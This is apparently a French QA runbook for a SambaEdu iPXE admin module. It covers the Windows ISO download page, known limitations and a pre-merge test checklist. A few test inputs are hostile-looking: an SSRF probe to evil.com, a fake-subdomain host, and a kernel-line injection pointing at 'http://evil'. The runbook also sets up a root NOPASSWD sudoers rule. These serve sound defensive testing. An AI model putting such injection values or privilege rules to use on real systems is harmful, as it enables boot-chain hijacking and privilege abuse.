2. **Sudoers `www-admin → install-win-iso.sh NOPASSWD`** — créer `/etc/sudoers.d/sambaedu-iso-install` :
   ```
   www-admin ALL=(root) NOPASSWD: /usr/share/sambaedu/scripts/install-win-iso.sh
   ```
   Permissions strictes : `chmod 0440 /etc/sudoers.d/sambaedu-iso-install` puis `visudo -c` pour valider.
3. **Filesystem `/var/sambaedu/unattended/install/os/iso/` writable par `www-admin`** :
   ```bash
   mkdir -p /var/sambaedu/unattended/install/os/iso
   chown -R www-admin:www-admin /var/sambaedu/unattended/install/os/iso
   chmod 0755 /var/sambaedu/unattended/install/os/iso
   ```
4. **Audit contrat `install-win-iso.sh`** : confirmer présence + exécutable + signature
   ```bash
   ls -la /usr/share/sambaedu/scripts/install-win-iso.sh
   sudo -u www-admin sudo -n /usr/share/sambaedu/scripts/install-win-iso.sh --help 2>&1 || true
   ```
   Le script doit accepter `<version_num> <iso_name>` en arguments positionnels (10|11 + nom du fichier ISO sous `iso/`).

#### Scénario 3.6-1 — Page admin accessible (auth admin)

```bash
# Pré-condition : admin authentifié avec `server.admin` Spatie.
curl -sS -b cookies.jar http://192.168.122.50/admin/ipxe/iso-windows
```

**Critères d'acceptation** :
- HTTP 200.
- Body contient `<h1>` ou heading "Gestion ISO Windows".
- Body contient les 4 sections : "Versions Windows déployées", "Nouveau téléchargement", "Historique", (et conditionnel "Téléchargement en cours" si run actif).
- Body contient le formulaire `<input type="url">` + bouton "Télécharger l'ISO".
- Pas de row dans `legacy_catchall_logs` pour `/admin/ipxe/iso-windows` (court-circuit natif).

#### Scénario 3.6-2 — 403 si user non-admin (teacher / student)

```bash
# Pré-condition : user `prof` authentifié sans permission `server.admin`.
curl -sS -b cookies-teacher.jar -w '\n%{http_code}\n' http://192.168.122.50/admin/ipxe/iso-windows
```

**Critères d'acceptation** :
- HTTP **403** (Spatie can:server.admin refuse).
- Body contient un message d'erreur d'autorisation.
- Pas de row insertion dans `windows_iso_downloads`.

#### Scénario 3.6-3 — Redirect 302 login si user anonyme

```bash
# Pas de cookie session.
curl -sS -I http://192.168.122.50/admin/ipxe/iso-windows
```

**Critères d'acceptation** :
- HTTP 302 (middleware `sambaedu.auth` redirige).
- Header `Location` pointe vers `/authentication/login` (ou équivalent SSO).

#### Scénario 3.6-4 — Liste versions avec filesystem peuplé

```bash
# Pré-condition (SSH VM côté Henri) :
sudo -u www-admin tee /var/sambaedu/unattended/install/os/Win10/version <<< 'Win10_22H2.iso'
sudo -u www-admin tee /var/sambaedu/unattended/install/os/Win11/version <<< 'Win11_24H2.iso'
sudo -u www-admin tee /var/sambaedu/unattended/install/os/Win11-old/version <<< 'Win11_23H2.iso'

# Smoke admin :
curl -sS -b cookies.jar http://192.168.122.50/admin/ipxe/iso-windows | grep -E 'Win10_22H2|Win11_24H2|Win11_23H2'
```

**Critères d'acceptation** :
- 3 occurrences visibles : Win10_22H2.iso (current), Win11_24H2.iso (current), Win11_23H2.iso (old).
- Win10-old slot = "non déployée" (badge ghost).

#### Scénario 3.6-5 — Liste versions filesystem absent (VM neuve)

```bash
# Pré-condition : aucun dossier Win{10,11}{,-old}/ sous /var/sambaedu/unattended/install/os/
sudo rm -rf /var/sambaedu/unattended/install/os/Win*

# Smoke admin :
curl -sS -b cookies.jar http://192.168.122.50/admin/ipxe/iso-windows
```

**Critères d'acceptation** :
- 4× badge "non déployée" (badge-ghost) dans la card "Versions Windows déployées".
- Log channel `ipxe` : 1× warning `ipxe.iso.sources.base_path_missing` à chaque mount() de la page (acceptable Phase 2 — non spammé car page humaine pas firmware).
- Pas d'erreur 500.

#### Scénario 3.6-6 — Submit URL valide → row pending + Job dispatched

```bash
# Action UI : admin clique "Télécharger l'ISO" avec
# url='https://software-static.download.prss.microsoft.com/.../Win11_24H2.iso'
# → modale confirm → bouton "Lancer le téléchargement"

# Vérifications côté serveur :
sudo -u postgres psql -d sambaedu -c "SELECT id, version, iso_name, status, source_url, initiated_by_user_id, host_ip FROM windows_iso_downloads ORDER BY id DESC LIMIT 1;"
tail -f /var/www/sambaedu-reload/storage/logs/ipxe/ipxe-$(date +%Y-%m-%d).log
```

**Critères d'acceptation** :
- 1 nouvelle row `windows_iso_downloads` avec `status='pending'` + `version='Win11'` + `iso_name='Win11_24H2.iso'` + `initiated_by_user_id` du current admin + `host_ip` du client.
- Log channel `ipxe` : event `ipxe.iso.download.submitted` avec context complet (download_id, iso_name, version, source_url, user_id, host_ip).
- Toast UI "Téléchargement lancé pour « Win11_24H2.iso » — suivi en bas de page.".
- Champ `url` Livewire reset (vide).
- La card "Téléchargement en cours" devient visible.
- `wire:poll.5s` actif sur cette card uniquement.
- Worker queue pickup : transition `pending` → `downloading` visible en DB < 30s.

#### Scénario 3.6-7 — Submit URL invalide (HTTP au lieu de HTTPS)

```bash
# Action UI : admin saisit url='http://download.microsoft.com/Win11.iso' puis clique "Télécharger l'ISO".
```

**Critères d'acceptation** :
- La validation Livewire `rules()` couche 1 refuse (regex `https://...iso`).
- Si bypass UI (POST direct via curl avec CSRF), le service couche 2 lève `WindowsIsoValidationException` "Scheme HTTPS obligatoire".
- Toast UI error.
- 0 row insertée dans `windows_iso_downloads`.
- 0 Job dispatché dans la queue `ipxe_iso_downloads`.

#### Scénario 3.6-8 — Submit URL hors allowlist host (anti-SSRF)

```bash
# Action UI : admin saisit url='https://evil.com/Win11_24H2.iso'.
```

**Critères d'acceptation** :
- Toast UI error : "Host 'evil.com' non autorisé (allowlist Microsoft uniquement).".
- 0 row insert.
- 0 Job dispatché.
- Log channel `ipxe` : optionnel event `ipxe.iso.submit.exception` si exception remontée (selon le path UI).

#### Scénario 3.6-9 — Submit double soumission concurrente (Cache::lock global)

```bash
# Pré-condition : un download est déjà en cours (status `downloading`).
# Action UI : un 2e admin (ou même admin via 2e onglet) tente une nouvelle soumission.
```

**Critères d'acceptation** :
- Toast UI error "Un téléchargement est déjà en cours, attendez sa fin ou annulez-le.".
- 0 nouvelle row insertée.
- 0 nouveau Job dispatché.
- Log channel `ipxe` : event `ipxe.iso.download.rejected_locked`.

#### Scénario 3.6-10 — Cancel d'un download en cours

```bash
# Pré-condition : 1 row `windows_iso_downloads` status='downloading' avec curl en cours.
# Action UI : admin clique bouton "Annuler" sur la card "Téléchargement en cours".
```

**Critères d'acceptation** :
- Row `status` mise à jour `cancelled` + `completed_at` non-null.
- Toast UI info "Téléchargement annulé. Le process en cours continuera jusqu'à sa fin naturelle.".
- Cache::lock global release (vérifiable en relançant un download après → pas de toast "déjà en cours").
- Log channel `ipxe` : event `ipxe.iso.download.cancelled`.
- Le polling `wire:poll.5s` stoppe automatiquement (card "en cours" disparaît).
- **Limitation connue** : le curl/install-win-iso.sh en cours continue jusqu'à fin naturelle ou son timeout (parité legacy — pas de SIGTERM Phase 2). Le Job détectera la transition `cancelled` à la prochaine `refresh()` et bypassera la suite.

#### Scénario 3.6-11 — (optionnel pré-prod) Smoke téléchargement réel ISO Microsoft

> **À exécuter UNIQUEMENT en pré-prod** : ~6 Go DL réseau microsoft.com → 30-60 min.

```bash
# Pré-condition : T0.5 actions Henri toutes validées (worker + sudoers + filesystem + script).
# Action UI : admin saisit une URL Microsoft réelle (ex. Win11_24H2 du site officiel).

# Surveillance Henri :
watch -n5 'sudo -u postgres psql -d sambaedu -t -c "SELECT id, status, exit_code, error FROM windows_iso_downloads ORDER BY id DESC LIMIT 1"'
sudo tail -f /var/www/sambaedu-reload/storage/logs/ipxe/ipxe-$(date +%Y-%m-%d).log
sudo ls -la /var/sambaedu/unattended/install/os/iso/
```

**Critères d'acceptation** :
- Phase 1 (curl) : `ls -la /var/.../iso/Win11_24H2.iso` grossit progressivement (taille en MB visibles).
- Transition `downloading` → `extracting` après ~30-60 min selon bande passante.
- Phase 2 (extract) : log channel `ipxe` event `install-win-iso: <log shell>`.
- Transition `extracting` → `success` après ~3-5 min selon CPU.
- Rotation : `/var/sambaedu/unattended/install/os/Win11/version` mis à jour avec le nouveau iso_name + ancienne Win11 renommée Win11-old.
- Toast UI success "ISO « Win11_24H2.iso » déployée avec succès.".
- Polling Livewire stoppe automatiquement.

#### Scénario 3.6-12 — (optionnel) Échec sudoers absent (T0.5 manquant)

> Test délibéré de robustesse — provoquer le cas "sudoers manquant" pour vérifier le message d'erreur côté UI.

```bash
# Pré-condition : retirer temporairement la règle sudoers.
sudo rm /etc/sudoers.d/sambaedu-iso-install

# Action UI : lancer un nouveau téléchargement (étape curl OK puis échec sudo).

# Restauration immédiate après le test :
sudo tee /etc/sudoers.d/sambaedu-iso-install <<'EOF'
www-admin ALL=(root) NOPASSWD: /usr/share/sambaedu/scripts/install-win-iso.sh
EOF
sudo chmod 0440 /etc/sudoers.d/sambaedu-iso-install
```

**Critères d'acceptation** :
- Transition `downloading` → `extracting` → `failed` (le curl réussit, l'extract échoue).
- `exit_code = 1` (ou code spécifique de `sudo -n` quand pas de tty/password).
- `error` contient `"sudo: a password is required"` ou `"no tty present and no askpass program specified"` (ou variante distro).
- Toast UI error "Échec du téléchargement de « <iso_name> » (exit 1). Consultez l'historique.".
- Cache::lock global release (vérifiable en relançant un download → pas de blocage).

#### Scénario 3.6-13 — (corrections post-review) Sous-domaine Microsoft accepté

> Documentation explicite : `*.download.microsoft.com` (ex. `secure.download.microsoft.com`) est **intentionnellement** accepté par le validator (design D5, cf. revue code 3-6.md #3 / #12 rejetés).
>
> Justification : Microsoft contrôle ses sous-domaines, et l'admin doit posséder la permission `server.admin` (rôle ultra-restreint). Le risque résiduel `attacker.download.microsoft.com` est jugé acceptable Phase 2.

```bash
# Test ad hoc en VM (depuis tinker) :
php artisan tinker
>>> $v = app(App\Ipxe\Iso\Services\WindowsIsoUrlValidator::class);
>>> $v->validate('https://secure.download.microsoft.com/path/Win11_25H1.iso');
# Doit retourner : ['url' => ..., 'iso_name' => 'Win11_25H1.iso', 'version' => 'Win11', 'version_num' => '11']
```

**Critères d'acceptation** :
- `secure.download.microsoft.com/Win11.iso` → ✅ accepté (sous-domaine Microsoft).
- `microsoft.com.evil.com/Win11.iso` → ❌ rejeté ("non autorisé") — attaque fake-subdomain bloquée.
- `microsoft.com/Win11.iso` → ❌ rejeté (host bare Microsoft hors allowlist).
- Si terrain demande de restreindre davantage : passer `IPXE_ISO_ALLOWED_HOSTS` env à la liste exacte sans `download.microsoft.com` parent → ouvrir une story dédiée.

#### Note — Accès à la page (D13 — pas de lien sidebar)

> #13 (post-review 2026-05-21, hors-scope D13) : l'accès à `/admin/ipxe/iso-windows` se fait par **URL directe** ou par bookmark navigateur — **aucun lien sidebar n'est livré en 3.6** (hors-scope strict — cf. D13).
>
> **Follow-up post-3.6** : Henri arbitre l'ajout d'un item sidebar dans `_layouts/partials/sidebar.blade.php` (section "iPXE" ou "Système") si besoin terrain. Une story de polishing UX peut être ouverte ; pour l'instant, l'URL est à communiquer aux admins via documentation interne.

### Limitations connues — Story 3.6

#### Pas de SIGTERM sur process en cours lors du cancel

L'admin qui clique "Annuler" met le row à `cancelled` mais le `curl` ou `install-win-iso.sh` continue jusqu'à fin naturelle / son timeout (parité legacy — `batch_command` ne SIGTERMait pas non plus). Le Job détectera la transition à la prochaine `refresh()` et bypassera la suite. Acceptable Phase 2.

#### Pas de housekeeping des rows orphelines

Si le worker queue crash sans release du lock global, le row `pending` reste indéfiniment. TTL 7200s du Cache::lock garantit qu'un nouveau download sera possible après 2h. Workaround manuel : annuler via UI ou `php artisan cache:clear` côté Henri. Cron de cleanup `cleanup-stuck-iso-downloads` Phase 3.

#### Pas de validation SHA256/checksum

Le legacy ne le fait pas non plus — parité stricte. Si besoin terrain (ISO Microsoft modifiée par MITM), ouvrir une story dédiée Phase 2/3.

#### Pas d'upload multipart HTTP de l'ISO

Parité legacy stricte — le legacy ne fait que `curl` depuis une URL publique. Si besoin terrain (admin sans Internet sortant), ouvrir une story dédiée.

#### Pas d'item menu iPXE firmware

3.6 livre une page admin **web** SE5, pas un menu firmware iPXE. L'item `/ipxe/admin` reste inchangé (D13). L'admin accède à la page via la sidebar SE5 (à ajouter par Henri post-3.6).

#### Pas de retrait du fichier legacy `Win10/win_iso.php`

Le catchall continue de servir l'URL legacy `/ipxe/Win10/win_iso.php` — cleanup global Story 3.7. Risque accepté : un admin pourrait utiliser la version legacy par habitude. Documentation interne à propager.

---

## Limitations connues — Story 3.5

### MachineBootLog Windows : pas de déduplication

Iso 3.4 — un poste qui redémarre plusieurs fois pendant une install échouée crée 1 row par fetch unattend/install.bat. Pas de dédup en Phase 2.

### Hook OOBE peut être reçu sans `winpe` préalable

Si un poste est ré-imaginé manuellement (Clonezilla sans passer par le menu iPXE), le hook OOBE arrive sans `winpe_start` préalable. `recordOobeComplete()` accepte cet état (idempotent — set os/status/last_report_at directement).

### Étapes post-install Windows complètes : déférées 3.7

Les étapes `sysprep`, `nosysprep`, `join`, `renomme`, `post`, `wpkg` du legacy `Win10/action.php` (lignes 411-720) ne sont **pas** portées en 3.5. Elles dépendent de `IpxeProgrammedActionResolver` non porté (GLM `actions[]` LDAP). Story 3.7 enrichira `WindowsPostInstallTracker`.

### Variante `installw11old` : déférée 3.7 (D14)

Si besoin terrain confirmé (`/var/sambaedu/unattended/install/os/Win11-old` présent + utilisé), ouvrir une story dédiée qui ajoute un case enum `install_win11_old` + asset path config-driven.

### sysprep.xml : stub minimal (D15)

`/ipxe/windows/sysprep.xml` retourne 200 + body vide tant que Story 3.7 n'enrichit pas `IpxeProgrammedActionResolver`. Le legacy `Win10/sysprep.xml.php` reste accessible via catchall (cleanup 3.7).

### Assets binaires Windows : servis par Apache via catchall

Les fichiers statiques `Win10/wimboot`, `Win10/winpeshl.ini`, `Win{10,11}/boot/bcd`, `Win{10,11}/boot/boot.sdi`, `Win{10,11}/sources/boot.wim` restent servis par Apache via catchall (non versionnés dans le repo SE5). Phase 2 acceptable.

---

## Limitations connues — Story 3.4

### MachineBootLog preseed : pas de déduplication

Un poste qui redémarre plusieurs fois pendant une install échouée crée 1 row `ipxe_linux_preseed` par fetch preseed du d-i. Pas de déduplication. Comportement iso-legacy (parité `preseed.php` qui faisait pire — pas de log du tout).

- **Impact estimé** : 50 postes × 5 retries → ~250 lignes parasites/jour en rentrée scolaire.
- **Décision Phase 2** : laisser. Rouvrir si la table explose (Phase 3 = check `started_at > now() - 30s`).

### Status `protected` post-install : préservé (post-review #M3)

Un poste avec `status='protected'` qui termine une install Linux **conserve** son status `protected` (au lieu d'être écrasé par `installation Linux terminee`). Les autres effets (`os='linux'`, `last_report_at`, `MachineBootLog`) sont conservés.

- **Traçabilité** : event log info `ipxe.linux.action.protected_preserved` avec `workstation_id`, `mac`, `ret`.
- **Justification** : le legacy `flag_poste=1` ne bloque JAMAIS la réinstall iPXE (vérifié) — il sert uniquement de protection anti-suppression DB lors des resync AD.

---

## Checklist rapide (avant merge `main` → prod)

- [ ] Scénario 3.1-1 (handshake) : `curl /ipxe/boot` → préambule iPXE OK
- [ ] Scénario 3.1-2 (MAC connue) : menu known affiché
- [ ] Scénario 3.1-3 (UUID priorité) : matching prio UUID OK
- [ ] Scénario 3.1-4 (poste inconnu) : menu default minimal
- [ ] Scénario 3.1-5 (LAN restriction) : 403 hors LAN
- [ ] Scénario 3.1-6 (non-régression `/ipxe/admin.php`) : catchall répond
- [ ] Scénario 3.1-7 (court-circuit catchall) : pas de row legacy_catchall_logs pour /ipxe/boot
- [ ] Scénario 3.1-8 (MachineBootLog peuplé) : rows `action='ipxe_boot'`
- [ ] Scénario 3.1-9 (smoke poste réel) — optionnel, valide en pré-prod
- [ ] Scénario 3.2-1 (handshake /ipxe/admin) : préambule + chain admin##params
- [ ] Scénario 3.2-2 (menu admin poste connu) : item maintenance + exit + retour
- [ ] Scénario 3.2-3 (menu admin poste inconnu) : item --key n set-name + pas d'item maintenance (modifié 3.3 — voir Scénario 3.3-1)
- [ ] Scénario 3.2-4 (handshake /ipxe/maintenance)
- [ ] Scénario 3.2-5 (menu maintenance) : rescuecd + winpe + factory_reset
- [ ] Scénario 3.2-6 (action rescuecd) : kernel sysresccd + 3 initrds
- [ ] Scénario 3.2-7 (action winpe) : kernel wimboot + initrds Win10
- [ ] Scénario 3.2-8 (action factory_reset) : kernel clonezilla + restoreparts
- [ ] Scénario 3.2-9 (action inconnue) : 404 + log warning
- [ ] Scénario 3.2-10 (catchall legacy /ipxe/admin.php) : 200 servi par catchall
- [ ] Scénario 3.2-11 (bascule known→admin natif) : chain sans `.php`
- [ ] Scénario 3.2-12 (MachineBootLog 3.2) : 3 actions persistées
- [ ] Scénario 3.2-13 (smoke poste réel) — optionnel, pré-prod uniquement
- [ ] Scénario 3.2-14 (post-correctif #1 — params block admin+maintenance) : `params\nparam mac\nparam uuid` en tête, pas de row `unknown:<ip>` après chain
- [ ] Scénario 3.2-15 (post-correctif #2 — whitelist version winpe) : injection `version=Win11\nkernel http://evil` → fallback Win11 pur
- [ ] Scénario 3.2-16 (post-correctif #3 — warning factory_reset) : event `ipxe.action.factory_reset_dispatched` niveau warning
- [ ] Scénario 3.3-1 (handshake enrollment/name) : préambule + chain
- [ ] Scénario 3.3-2 (création poste neuf) : Workstation + AD samba-tool computer create + netbootGUID
- [ ] Scénario 3.3-3 (idempotent same name) : message "deja enregistree"
- [ ] Scénario 3.3-4 (nom déjà pris) : ERREUR + pas de modification
- [ ] Scénario 3.3-5 (renommage delete+recreate AD plan B D14)
- [ ] Scénario 3.3-6 (affectation salle physique)
- [ ] Scénario 3.3-7 (room — poste inconnu) : erreur + chain admin
- [ ] Scénario 3.3-8 (ajout parc logique) : pivot + observer
- [ ] Scénario 3.3-9 (retrait parc logique)
- [ ] Scénario 3.3-10 (anti-injection nom) : 200 + ERREUR + pas de samba-tool
- [ ] Scénario 3.3-11 (non-régression menu admin natif — items enrollment)
- [ ] Scénario 3.3-12 (non-régression catchall `/ipxe/enregistrement.php` legacy)
- [ ] Scénario 3.3-13 (MachineBootLog peuplé pour 5 actions enrollment)
- [ ] Scénario 3.3-14 (BYOD audit-only — pas de Workstation ni AD)
- [ ] Scénario 3.3-15 (feature-flag enrollment.enabled=false)
- [ ] Scénario 3.3-16 (smoke poste réel — optionnel pré-prod)
- [ ] Scénario 3.4-1 (menu installation-linux poste connu) : 9 items install_*
- [ ] Scénario 3.4-2 (menu installation-linux poste inconnu) : message erreur + chain admin
- [ ] Scénario 3.4-3 (item `(l)` Installation Linux dans /ipxe/admin) : visible si enabled, masqué si IPXE_INSTALL_LINUX_ENABLED=false
- [ ] Scénario 3.4-4 (action install_deb_gnome) : kernel debian-installer + URL preseed avec os=trixie&type=gnome
- [ ] Scénario 3.4-5 (action install_ubuntu64) : kernel ubuntu-installer + perso=1
- [ ] Scénario 3.4-6 (action install_nird) : kernel /nird/casper + NFS root
- [ ] Scénario 3.4-7 (preseed debian/gnome) : ~4000 chars + tasksel gnome-desktop + hostname interpolé + audit MachineBootLog
- [ ] Scénario 3.4-8 (preseed poste inconnu) : 404 + log warning
- [ ] Scénario 3.4-9 (preseed os/type hors whitelist) : 422 + log warning invalid_distribution|invalid_variant
- [ ] Scénario 3.4-10 (hook /ipxe/linux/action ret=0) : Workstation.os='linux' + status='installation Linux terminee' + MachineBootLog
- [ ] Scénario 3.4-11 (stub /ipxe/linux/autorun) : #!/bin/bash + echo + exit 0
- [ ] Scénario 3.4-12 (sécurité LAN) : 403 hors LAN
- [ ] Scénario 3.4-13 (non-régression menu admin) — optionnel : items 3.2+3.3+3.4 cohabitent
- [ ] Scénario 3.4-14 (smoke poste réel install Debian) — optionnel pré-prod
- [ ] Scénario 3.5-1 (menu installation-windows poste connu) : 7 items install_win*
- [ ] Scénario 3.5-2 (menu installation-windows poste inconnu) : message erreur + chain admin
- [ ] Scénario 3.5-3 (item `(w)` Installation Windows dans /ipxe/admin) : visible si enabled, masqué si IPXE_INSTALL_WINDOWS_ENABLED=false
- [ ] Scénario 3.5-4 (action install_win11) : kernel Win10/wimboot + initrds + BCD/boot.wim Win11
- [ ] Scénario 3.5-5 (action install_win10_perso) : perso=1 dans cmdline
- [ ] Scénario 3.5-6 (action install_win11_disk) : disk=1 dans cmdline
- [ ] Scénario 3.5-7 (install.bat Win11 UEFI) : CRLF strict + setup.exe + URL native action
- [ ] Scénario 3.5-8 (unattend.xml Win11 UEFI) : DOMDocument valid + BypassTPM + UnattendedJoin + ComputerName
- [ ] Scénario 3.5-9 (unattend.xml poste inconnu) : 404 + log warning
- [ ] Scénario 3.5-10 (unattend.xml version hors whitelist) : 422 + log warning
- [ ] Scénario 3.5-11 (hook /ipxe/windows/action winpe) : Workstation.status='installation WinPE' + MachineBootLog
- [ ] Scénario 3.5-12 (hook /ipxe/windows/action oobe) : Workstation.os='windows' + status='installation Windows terminee'
- [ ] Scénario 3.5-13 (hook étape déférée sysprep) : 200 + log warning unsupported_step
- [ ] Scénario 3.5-14 (diskpart.txt iso-legacy) : body strict + MachineBootLog
- [ ] Scénario 3.5-15 (sysprep.xml stub) : 200 + body vide + log info stub_served
- [ ] Scénario 3.5-16 (sécurité LAN) : 403 hors LAN
- [ ] Scénario 3.5-17 (non-régression catchall `.php`) : Win10/repair.bat.php + clonage.php + installation-windows.php restent via catchall
- [ ] Scénario 3.5-18 (smoke poste réel install Win11) — optionnel pré-prod
- [ ] Scénario 3.6-1 (page admin accessible auth admin) : 200 + 4 cards visibles
- [ ] Scénario 3.6-2 (403 user non-admin)
- [ ] Scénario 3.6-3 (redirect 302 login si anonyme)
- [ ] Scénario 3.6-4 (liste versions filesystem peuplé) : 3 versions visibles + 1 "non déployée"
- [ ] Scénario 3.6-5 (filesystem absent) : 4× "non déployée" + log warning
- [ ] Scénario 3.6-6 (submit URL valide) : row pending + Job dispatch + toast success
- [ ] Scénario 3.6-7 (URL HTTP au lieu HTTPS) : toast error + pas d'insert
- [ ] Scénario 3.6-8 (URL hors allowlist host) : toast error "Host non autorisé"
- [ ] Scénario 3.6-9 (double soumission concurrente) : Cache::lock rejette + log rejected_locked
- [ ] Scénario 3.6-10 (cancel running) : status→cancelled + lock release + toast info
- [ ] Scénario 3.6-11 (téléchargement réel ISO) — optionnel pré-prod uniquement
- [ ] Scénario 3.6-12 (sudoers manquant) — optionnel robustesse
- [ ] Scénario 3.6-13 (sous-domaine Microsoft accepté D5) — corrections post-review #3/#12

> Smoke automatisable : voir Story 3.1 et 3.2 § "Smoke test à exécuter quand VM up"
> dans `_bmad-output/implementation-artifacts/3-1-ipxe-service-core.md`.

---

## Story 3.7 — Clonage et Maintenance

**Date livraison** : 2026-05-22
**Migrations à appliquer** : aucune (D11 — colonne `machine_boot_logs.action` VARCHAR(20) suffisante pour les nouvelles valeurs `ipxe_clonezilla`, `ipxe_gparted`, `ipxe_hdt`, `ipxe_memtest`)
**Permissions requises** : aucune (firmware iPXE LAN-only — middleware `auth.v1.lan-only`)
**Variables `.env` à vérifier** :
- `IPXE_CLONEZILLA_ENABLED=true` (master switch clonezilla — défaut `true`)
- `IPXE_CLONEZILLA_TIMEOUT_MS=10000` (timeout menu clonezilla en ms)
- `IPXE_GPARTED_ENABLED=true` / `IPXE_HDT_ENABLED=true` / `IPXE_MEMTEST_ENABLED=true`
- `IPXE_GPARTED_KERNEL=/bin/gparted/vmlinuz` — chemin kernel GParted relatif racine web
- `IPXE_HDT_PXELINUX0=/bin/pxelinux.0` / `IPXE_HDT_CFG=/bin/pxelinux.cfg/hdt.cfg`
- `IPXE_MEMTEST_PXELINUX0=/bin/pxelinux.0` / `IPXE_MEMTEST_CFG=/bin/pxelinux.cfg/memtest86plus.cfg`

**Décisions ratifiées** : D1 410 Gone + iPXE body (firmware ne suit pas les 302), D2 idem factory_reset pour clonezilla restore, D3 paths binaires dans `config/ipxe.php` section `tools`, D4 valeurs distinctes boot_log (`ipxe_clonezilla`, `ipxe_gparted`, `ipxe_hdt`, `ipxe_memtest`), D5 `direct_legacy_routes: ^/ipxe/` conservé, D6 gparted/hdt/memtest86+ servis depuis racine web (pas `/ipxe/` prefix — chemin Apache catchall), D7 clonezilla non-batché (parité legacy), D8 enum `IpxeAdminAction` whitelist sécurité critique, D9 enum `IpxeMenuKind` alignement pattern 3.2/3.4/3.5, D10 cleanup catchall Epic 3 closure, D11 pas de migration, D12 regex route `[a-z0-9_]+` étendue (chiffres dans noms d'action), D13 catchall bloque `^ipxe/action/` avec 410 pour actions invalides

### Section 16 — Story 3.7 — Clonage et Maintenance

#### Prérequis VM (T0.6 actions Henri pré-smoke)

> 3 points à valider AVANT le premier smoke test 3.7.

1. **Binaires clonezilla disponibles** : `ls /var/www/sambaedu/clonezilla/vmlinuz` et `initrd.img` + `filesystem.squashfs`
2. **Binaires GParted** : `ls /var/www/sambaedu/bin/gparted/vmlinuz` (si `IPXE_GPARTED_ENABLED=true`)
3. **pxelinux.0 disponible** : `ls /var/www/sambaedu/bin/pxelinux.0` + cfg `hdt.cfg` / `memtest86plus.cfg`
4. **Cache reset** : `php artisan config:cache && php artisan route:cache && php artisan view:cache`

#### Scénario 3.7-1 — Handshake clonezilla-menu (sans paramètres)

```bash
# Depuis la VM ou LAN — GET sans mac/uuid
curl -sS http://192.168.122.50/ipxe/clonezilla-menu
```

**Attendu** :
- HTTP 200, `Content-Type: text/plain`
- Body contient `#!ipxe`
- Body contient `chain --replace --autofree clonezilla-menu##params`
- Pas de menu complet (comportement handshake)

#### Scénario 3.7-2 — Menu clonezilla complet (POST avec mac/uuid connu)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/clonezilla-menu \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=11111111-1111-1111-1111-111111111111'
```

**Attendu** :
- HTTP 200, `Content-Type: text/plain`
- Body contient `#!ipxe`
- Body contient `item --key l clonezilla_live`
- Body contient `item --key s clonezilla_save`
- Body contient `item --key r clonezilla_restore`
- Body contient `item --key b retour`
- Body contient `item --key x exit`
- Body contient `chain --replace --autofree` vers `/ipxe/maintenance##params` (retour)

#### Scénario 3.7-3 — Menu maintenance étendu (4 nouveaux items)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/maintenance \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=11111111-1111-1111-1111-111111111111'
```

**Attendu** :
- Body contient `item --key z clonezilla` (sous-menu clonezilla)
- Body contient `item --key g gparted`
- Body contient `item --key h hdt`
- Body contient `item --key t memtest`
- Body contient `chain --replace --autofree` vers `/ipxe/clonezilla-menu##params` (item z)
- Body contient `chain --replace --autofree` vers `/ipxe/action/gparted##params` (item g)

#### Scénario 3.7-4 — Action clonezilla_live

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/clonezilla_live \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=11111111-1111-1111-1111-111111111111'
```

**Attendu** :
- HTTP 200
- Body contient `kernel` + `clonezilla/vmlinuz`
- Body contient `initrd` + `clonezilla/initrd.img`
- Body contient `fetch=` + `clonezilla/filesystem.squashfs`
- Body se termine par `boot`
- `machine_boot_logs` : nouvelle ligne avec `action='ipxe_clonezilla'`, `initiated_by='ipxe:clonezilla_live'`

#### Scénario 3.7-5 — Action clonezilla_save_sda1_sda2

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/clonezilla_save_sda1_sda2 \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=11111111-1111-1111-1111-111111111111'
```

**Attendu** :
- HTTP 200
- Body contient `saveparts savesda1 sda1` (commande ocs-sr sauvegarde)
- Body contient `ocs_prerun="mount -t auto /dev/sda2 /home/partimag/"`
- Boot log `action='ipxe_clonezilla'`, `initiated_by='ipxe:clonezilla_save_sda1_sda2'`

#### Scénario 3.7-6 — Action clonezilla_restore_sda2_sda1

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/clonezilla_restore_sda2_sda1 \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=11111111-1111-1111-1111-111111111111'
```

**Attendu** :
- HTTP 200
- Body contient `restoreparts savesda1 sda1` (commande ocs-sr restauration)
- Même noyau/initrd/filesystem que clonezilla_live (D2)
- Boot log `action='ipxe_clonezilla'`

#### Scénario 3.7-7 — Actions diagnostic (gparted, hdt, memtest86plus)

```bash
# GParted
curl -sS -X POST http://192.168.122.50/ipxe/action/gparted \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=11111111-1111-1111-1111-111111111111'
# HDT
curl -sS -X POST http://192.168.122.50/ipxe/action/hdt \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=11111111-1111-1111-1111-111111111111'
# Memtest86+
curl -sS -X POST http://192.168.122.50/ipxe/action/memtest86plus \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=11111111-1111-1111-1111-111111111111'
```

**Attendu gparted** :
- HTTP 200, body contient `gparted` + `filesystem.squashfs` + `vmlinuz` (depuis racine web, pas `/ipxe/`)
- Boot log `action='ipxe_gparted'`

**Attendu hdt** :
- HTTP 200, body contient `set 209:string` + `pxelinux.cfg/hdt.cfg`
- Body contient `chain --replace --autofree` vers `pxelinux.0`
- Boot log `action='ipxe_hdt'`

**Attendu memtest86plus** :
- HTTP 200, body contient `pxelinux.cfg/memtest86plus.cfg`
- Boot log `action='ipxe_memtest'`

#### Scénario 3.7-8 — Catchall bloqué (routes legacy 3.7 répondent 410)

```bash
# Clonezilla legacy
curl -sS -o /dev/null -w "%{http_code}" http://192.168.122.50/ipxe/clonezilla_menu.php
curl -sS -o /dev/null -w "%{http_code}" http://192.168.122.50/ipxe/clonezilla.php
curl -sS -o /dev/null -w "%{http_code}" http://192.168.122.50/ipxe/gparted.php
curl -sS -o /dev/null -w "%{http_code}" http://192.168.122.50/ipxe/hdt.php
curl -sS -o /dev/null -w "%{http_code}" http://192.168.122.50/ipxe/memtest86plus.php
```

**Attendu** : chaque commande retourne `410`
